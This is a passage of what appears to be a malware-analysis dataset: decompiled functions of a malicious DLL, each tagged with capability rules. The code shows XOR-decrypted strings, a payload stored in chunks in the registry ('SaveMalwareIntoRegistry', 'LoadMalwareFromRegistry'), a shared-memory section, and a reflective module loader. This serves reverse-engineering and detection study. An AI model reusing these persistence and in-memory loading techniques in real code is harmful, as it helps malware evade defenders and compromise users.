fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupWow64QueyProcessModules64 : NameBuf : %ws\"\n                                                 , 0x2c8);\n                                    uVar10 = 0;\n                                    if (var_68h != 0) {\n                                        do {\n                                            *(uVar10 + 0x20 + piVar14) = puVar5[uVar10 * 2];\n                                            uVar10 = uVar10 + 1;\n                                        } while (uVar10 < var_68h);\n                                    }\n                                    *(var_68h + 0x20 + piVar14) = 0;\n                                    iVar6 = (*_sym.imp.ntdll.dll_strrchr)(piVar14 + 8, 0x5c);\n                                    *(piVar14 + 0x1e) = iVar6 + (-0x1f - piVar14);\n                                }\n                                piVar14 = piVar14 + 0x48;\n                                var_5ch = var_5ch + 1;\n                            }\n                        } while ((var_74h != var_30h) || (iVar13 = var_58h,  iVar9 = var_64h,  var_70h != var_4h));\n                    }\n                    if (var_6ch != NULL) {\n                        *var_6ch = var_5ch;\n                    }\n                }\n            }\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_34h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar11 != 0) {\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_4ch;\n    }\n    if ((var_4ch <= arg_8h) && (var_4ch != 0)) {\n        var_60h = 1;\n    }\n    uVar8 = (*pcVar12)(0, iVar9);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    uVar8 = (*pcVar12)(0, iVar13);\n    (*pcVar4)(uVar8);\n    return var_60h;\n}\n",
        "token_count": 3246
    },
    "0040be30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040be30(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    uint32_t *puVar7;\n    uint var_10h;\n    uint lpString2;\n    uint32_t lpString1;\n    uint32_t var_4h;\n    \n    fcn.0040adb1();\n    fcn.0040b534(0, &var_4h);\n    lpString1 = var_4h;\n    puVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar2 != NULL) {\n        do {\n            iVar3 = fcn.0040b534(lpString1, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar3 != 0) || (var_4h <= lpString1)) break;\n            lpString1 = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar2, 0, 0x8000);\n            puVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar2 != NULL);\n        uVar6 = 2;\n        if ((puVar2 != NULL) && (uVar1 <= lpString1)) {\n            var_4h = 0;\n            puVar7 = puVar2 + 2;\n            if (*puVar2 != 0) {\n                do {\n                    iVar3 = *(puVar7 + 0x1e) + 0x20 + puVar7;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(iVar3, in_EDX),  iVar4 == 0)) {\ncode_r0x0040bf3d:\n                        uVar6 = 0;\n                        *arg_8h = puVar7[2];\n                        arg_8h[1] = puVar7[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar7[4];\n                        }\n                        break;\n                    }\n                    puVar5 = (*_sym.imp.ntdll.dll_strchr)(iVar3, 0x2e);\n                    if (puVar5 != NULL) {\n                        *puVar5 = 0;\n                        iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(iVar3, in_EDX);\n                        if (iVar3 == 0) goto code_r0x0040bf3d;\n                    }\n                    puVar7 = puVar7 + 0x48;\n                    var_4h = var_4h + 1;\n                } while (var_4h < *puVar2);\n            }\n            goto code_r0x0040bf5e;\n        }\n    }\n    uVar6 = 8;\ncode_r0x0040bf5e:\n    if (puVar2 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar2, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 749
    },
    "0040c6d9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040c6d9(int32_t *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    char *pcVar10;\n    char *pcVar11;\n    uint ARG_0;\n    uint lpValueName;\n    int32_t *var_64h;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    uint32_t var_58h;\n    int32_t var_54h;\n    int32_t hKey;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    var_64h = param_1;\n    var_24h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    uVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if ((((uVar3 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_5ch = uVar3;\n        fcn.0040c548();\n        hKey = fcn.0040c411(0x20006);\n        if (hKey != 0) {\n            var_54h = *param_1;\n            var_4ch = 0x555e6e51;\n            var_48h = 0x771b5728;\n            var_44h = 0x554e6e41;\n            var_40h = 0x7717570f;\n            var_58h = (((var_54h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar9 = &ARG_0;\n            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_3ch = 0x55506e52;\n            puVar9 = &lpValueName;\n            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_38h = 0x775f5723;\n            var_34h = 0x55376e57;\n            var_ch = 0x55376e33;\n            var_8h = 0x777a5746;\n            fcn.00401000(0x38);\n            iVar5 = var_60h;\n            uVar3 = 0;\n            do {\n                puVar1 = uVar3 + var_60h;\n                uVar4 = uVar3 & 0x80000007;\n                if (uVar4 < 0) {\n                    uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                }\n                uVar3 = uVar3 + 1;\n                *puVar1 = *(&var_ch + uVar4) ^ puVar1[&var_4ch - var_60h];\n            } while (uVar3 < 0x1c);\n            pcVar11 = \"wszBinaryImageTemplate_EncryptedStackedBuffer\";\n            uVar2 = 0xd9;\n            pcVar10 = \"GTK DLL: regstor.cpp:%d > SaveMalwareIntoRegistry : decrypt (wide char) %s -> %ws\";\n            iVar8 = var_60h;\n            fcn.00403bde(\"GTK DLL: regstor.cpp:%d > SaveMalwareIntoRegistry : decrypt (wide char) %s -> %ws\", 0xd9);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar5, var_24h, pcVar10, uVar2, pcVar11, iVar8);\n            fcn.00403bde(\"GTK DLL: regstor.cpp:%d > SaveMalwareIntoRegistry : here is %d parts of body.\", 0xdc);\n            var_10h = 0x55263862;\n            var_14h = 0;\n            var_ch = 0x47687a0e;\n            var_8h = 0x5155555c;\n            var_20h = 0x55553847;\n            var_1ch._0_2_ = 0x7a51;\n            var_1ch._2_1_ = 0x4d;\n            var_24h = 7;\n            do {\n                fcn.00401000(0x18);\n                iVar5 = var_18h;\n                iVar8 = 0;\n                do {\n                    puVar1 = iVar8 + var_18h;\n                    iVar7 = iVar8 % var_24h;\n                    iVar8 = iVar8 + 1;\n                    *puVar1 = *(&var_20h + iVar7) ^ puVar1[&var_10h - var_18h];\n                } while (iVar8 < 0xc);\n                pcVar11 = \"wszLsd_EncryptedStackedBuffer\";\n                uVar2 = 0xe1;\n                pcVar10 = \"GTK DLL: regstor.cpp:%d > SaveMalwareIntoRegistry : decrypt (wide char) %s -> %ws\";\n                iVar8 = var_18h;\n                fcn.00403bde(\"GTK DLL: regstor.cpp:%d > SaveMalwareIntoRegistry : decrypt (wide char) %s -> %ws\", 0xe1);\n                puVar9 = &lpValueName;\n                for (iVar7 = 0x40; iVar6 = var_14h,  iVar7 != 0; iVar7 = iVar7 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar5, &ARG_0, var_14h, pcVar10, uVar2, pcVar11, iVar8);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                var_14h = iVar6 + 1;\n            } while (var_14h < 0x32);\n            var_18h = 0;\n            if (0 < var_58h) {\n                var_14h = 0;\n                var_30h = 0x55263862;\n                var_2ch = 0x47687a0e;\n                var_28h = 0x5155555c;\n                var_ch = 0x55553847;\n                var_8h = var_8h & 0xff000000 | 0x4d7a51;\n                do {\n                    fcn.00401000(0x18);\n                    iVar5 = var_20h;\n                    iVar8 = 0;\n                    do {\n                        puVar1 = iVar8 + var_20h;\n                        iVar7 = iVar8 % var_24h;\n                        iVar8 = iVar8 + 1;\n                        *puVar1 = *(&var_ch + iVar7) ^ puVar1[&var_30h - var_20h];\n                    } while (iVar8 < 0xc);\n                    pcVar11 = \"wszLsd_EncryptedStackedBuffer\";\n                    uVar2 = 0xe9;\n                    pcVar10 = \"GTK DLL: regstor.cpp:%d > SaveMalwareIntoRegistry : decrypt (wide char) %s -> %ws\";\n                    iVar7 = var_20h;\n                    fcn.00403bde(\"GTK DLL: regstor.cpp:%d > SaveMalwareIntoRegistry : decrypt (wide char) %s -> %ws\", \n                                 0xe9);\n                    iVar8 = var_18h;\n                    puVar9 = &lpValueName;\n                    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar9 = 0;\n                        puVar9 = puVar9 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar5, &ARG_0, iVar8, pcVar10, uVar2, pcVar11, iVar7)\n                    ;\n                    iVar8 = 0x7d000;\n                    if (var_54h < 0x7d000) {\n                        iVar8 = var_54h;\n                    }\n                    iVar7 = var_64h[1] + var_14h;\n                    fcn.00403bde(\"GTK DLL: regstor.cpp:%d > RegSetValueBinary : write buffer %p, length %d\", 0x35);\n                    iVar8 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, &lpValueName, 0, 3, iVar7, iVar8);\n                    fcn.00403bde(\"GTK DLL: regstor.cpp:%d > RegSetValueBinary : RegSetValueExW(%ws) : %p\", 0x3a);\n                    var_1h._0_1_ = iVar8 == 0;\n                    fcn.00403bde(\"GTK DLL: regstor.cpp:%d > SaveMalwareIntoRegistry : RegSetValueBinary returned : %d\", \n                                 0xf4);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    var_14h = var_14h + 0x7d000;\n                    var_18h = var_18h + 1;\n                    var_54h = var_54h + -0x7d000;\n                } while (var_18h < var_58h);\n            }\n            uVar3 = var_5ch;\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_60h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return uVar3 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 2579
    },
    "0040ca70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040ca70(int32_t *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    code *pcVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    uchar *puVar11;\n    char *pcVar12;\n    char *pcVar13;\n    uint ARG_0;\n    uint var_a8h;\n    uint var_64h;\n    int32_t hKey;\n    int32_t var_5ch;\n    int32_t *var_58h;\n    int32_t var_54h;\n    uchar *var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uchar *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *param_1 = 0;\n    param_1[1] = 0;\n    var_58h = param_1;\n    var_14h = param_2;\n    uVar2 = (*pcVar8)(0, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_44h = iVar3;\n        fcn.0040c548();\n        var_5ch = fcn.0040c411(0x20019);\n        if (var_5ch != 0) {\n            var_48h = 0;\n            var_3ch = 0x555e6e51;\n            puVar9 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_38h = 0x771b5728;\n            puVar9 = &var_a8h;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_34h = 0x554e6e41;\n            var_30h = 0x7717570f;\n            var_2ch = 0x55506e52;\n            var_28h = 0x775f5723;\n            var_24h = 0x55376e57;\n            var_ch = 0x55376e33;\n            var_8h = 0x777a5746;\n            fcn.00401000(0x38);\n            iVar3 = var_54h;\n            uVar5 = 0;\n            do {\n                puVar1 = uVar5 + var_54h;\n                uVar4 = uVar5 & 0x80000007;\n                if (uVar4 < 0) {\n                    uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                }\n                uVar5 = uVar5 + 1;\n                *puVar1 = *(&var_ch + uVar4) ^ puVar1[&var_3ch - var_54h];\n            } while (uVar5 < 0x1c);\n            pcVar13 = \"wszBinaryImageTemplate_EncryptedStackedBuffer\";\n            uVar2 = 0x120;\n            pcVar12 = \"GTK DLL: regstor.cpp:%d > LoadMalwareFromRegistry : decrypt (wide char) %s -> %ws\";\n            iVar10 = var_54h;\n            fcn.00403bde(\"GTK DLL: regstor.cpp:%d > LoadMalwareFromRegistry : decrypt (wide char) %s -> %ws\", 0x120);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar3, var_14h, pcVar12, uVar2, pcVar13, iVar10);\n            var_20h = 0x55263862;\n            var_1ch = 0x47687a0e;\n            var_18h = 0x5155555c;\n            var_ch = 0x55553847;\n            var_8h = var_8h & 0xff000000 | 0x4d7a51;\n            do {\n                puVar9 = &var_64h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                puVar9 = &var_a8h;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                fcn.00401000(0x18);\n                iVar3 = var_14h;\n                iVar10 = 0;\n                do {\n                    var_10h = 7;\n                    puVar1 = iVar10 + var_14h;\n                    iVar6 = iVar10 % 7;\n                    iVar10 = iVar10 + 1;\n                    *puVar1 = *(&var_ch + iVar6) ^ puVar1[&var_20h - var_14h];\n                } while (iVar10 < 0xc);\n                pcVar13 = \"wszLsd_EncryptedStackedBuffer\";\n                uVar2 = 299;\n                pcVar12 = \"GTK DLL: regstor.cpp:%d > LoadMalwareFromRegistry : decrypt (wide char) %s -> %ws\";\n                iVar6 = var_14h;\n                fcn.00403bde(\"GTK DLL: regstor.cpp:%d > LoadMalwareFromRegistry : decrypt (wide char) %s -> %ws\", 299);\n                iVar10 = var_48h;\n                (*_sym.imp.USER32.dll_wsprintfW)(&var_a8h, iVar3, &ARG_0, var_48h, pcVar12, uVar2, pcVar13, iVar6);\n                var_48h = iVar10 + 1;\n                fcn.00403bde(\"GTK DLL: regstor.cpp:%d > LoadMalwareFromRegistry : read %ws\", 0x12e);\n                iVar10 = 0;\n                var_1h._0_1_ = '\\0';\n                var_40h = NULL;\n                var_10h = 0;\n                hKey = fcn.0040c411(0x20019);\n                param_1 = var_58h;\n                if (hKey != 0) {\n                    var_50h = NULL;\n                    var_4ch = 0;\n                    iVar6 = fcn.0040c486(&var_50h, &var_4ch);\n                    if (iVar6 != 0) {\n                        var_40h = var_50h;\n                        var_10h = var_4ch;\n                        var_1h._0_1_ = '\\x01';\n                        iVar10 = var_4ch;\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                }\n                fcn.00403bde(\"GTK DLL: regstor.cpp:%d > LoadMalwareFromRegistry : ReadRegistryBinaryBlob : %d, ReadedData.cbData : %d\"\n                             , 0x133);\n                if (((var_1h != '\\0') && (var_40h != NULL)) && (iVar10 != 0)) {\n                    if (param_1[1] == 0) {\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n                        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    }\n                    else {\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1], *param_1 + iVar10);\n                        iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                    }\n                    param_1[1] = iVar3;\n                    puVar7 = var_40h;\n                    puVar11 = iVar3 + *param_1;\n                    for (iVar10 = var_10h; iVar10 != 0; iVar10 = iVar10 + -1) {\n                        *puVar11 = *puVar7;\n                        puVar7 = puVar7 + 1;\n                        puVar11 = puVar11 + 1;\n                    }\n                    *param_1 = *param_1 + var_10h;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_40h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    iVar3 = var_14h;\n                }\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_5ch);\n            uVar2 = (*pcVar8)(0, var_54h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar3 = var_44h;\n        }\n        uVar2 = (*pcVar8)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2351
    },
    "0040cd74": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040cd74(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    uVar3 = *0x427d40;\n    if (*0x427df0 != 0) {\n        return 1;\n    }\n    var_3ch = 0x5a377938;\n    var_38h = 0x363e512b;\n    var_34h = 0x5a287923;\n    var_30h = 0x361b511f;\n    var_2ch = 0x5a217922;\n    var_28h = 0x36125102;\n    var_24h = 0x5a36792e;\n    var_20h = 0x361e5134;\n    var_1ch = 0x5a21791c;\n    var_18h = 0x360e5132;\n    var_14h = 0x5a2b7926;\n    var_10h = 0x367a513f;\n    var_ch = 0x5a44794f;\n    var_8h = 0x367a5151;\n    fcn.00401000(0x60);\n    uVar4 = 0;\n    do {\n        puVar1 = uVar4 + var_4h;\n        uVar2 = uVar4 & 0x80000007;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n        }\n        uVar4 = uVar4 + 1;\n        *puVar1 = *(&var_ch + uVar2) ^ puVar1[&var_3ch - var_4h];\n    } while (uVar4 < 0x30);\n    fcn.00403bde(\"GTK DLL: shared_memorycpp.cpp:%d > WriteSharedSectionString : decrypt (wide char) %s -> %ws\", 0xb);\n    *0x427df0 = (*_sym.imp.KERNEL32.dll_CreateFileMappingW)(0xffffffff, 0, 4, 0, 0x208, var_4h);\n    if (*0x427df0 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.00403bde(\"GTK DLL: shared_memorycpp.cpp:%d > WriteSharedSectionString : Could not create file mapping object (%d).\\n\"\n                     , 0x17);\n    }\n    else {\n        if ((*0x427dec != 0) ||\n           (*0x427dec = (*_sym.imp.KERNEL32.dll_MapViewOfFile)(*0x427df0, 0xf001f, 0, 0, 0x208),  *0x427dec != 0)) {\n            fcn.00403bde(\"GTK DLL: shared_memorycpp.cpp:%d > WriteSharedSectionString : copy to SHM %ws\\n\", 0x2e);\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(*0x427dec, uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.00403bde(\"GTK DLL: shared_memorycpp.cpp:%d > WriteSharedSectionString : Could not map view of file (%d).\\n\"\n                     , 0x26);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x427df0);\n        *0x427df0 = 0;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return 0;\n}\n",
        "token_count": 985
    },
    "0040cf9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040cf9a(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(0, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 371
    },
    "0040d1ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d1ea(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char cVar7;\n    int32_t iVar8;\n    code **ppcVar9;\n    code *pcVar10;\n    uint32_t *puVar11;\n    uint32_t uVar12;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar12 = 0;\n    ppcVar9 = arg_8h[0xc];\n    if (ppcVar9 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar10 = *arg_8h;\n        arg_8h = ppcVar9;\n        (*pcVar10)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar9[0xf] + ppcVar9;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar9;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar9;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar8 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar9 = ppcVar1 + 0x210;\n                        do {\n                            iVar8 = iVar8 + 1;\n                            *ppcVar9 = cVar3;\n                            ppcVar9 = ppcVar9 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar8];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar8 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar8 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar8 < 0) {\n                        iVar8 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_8h = iVar5 + arg_8h;\n                        var_18h = iVar6 + arg_8h;\n                        while( true ) {\n                            ppcVar9 = *var_8h;\n                            if (ppcVar9 == NULL) break;\n                            if (ppcVar9 < 0) {\n                                if ((ppcVar9 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar9)) {\n                                    var_4h = *var_8h;\n                                    ppcVar9 = NULL;\n                                }\n                            }\n                            else {\n                                ppcVar9 = ppcVar9 + arg_8h;\n                            }\n                            if (ppcVar9 != NULL) {\n                                pcVar10 = ppcVar9 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar10;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar10[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar10;\n                                ppcVar9 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar8 = (*ppcVar1[2])(var_14h, ppcVar9, var_4h, &var_20h);\n                            if (iVar8 < 0) {\n                                iVar8 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_8h = var_8h + 1;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar8 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar10 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar11 = pcVar10 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 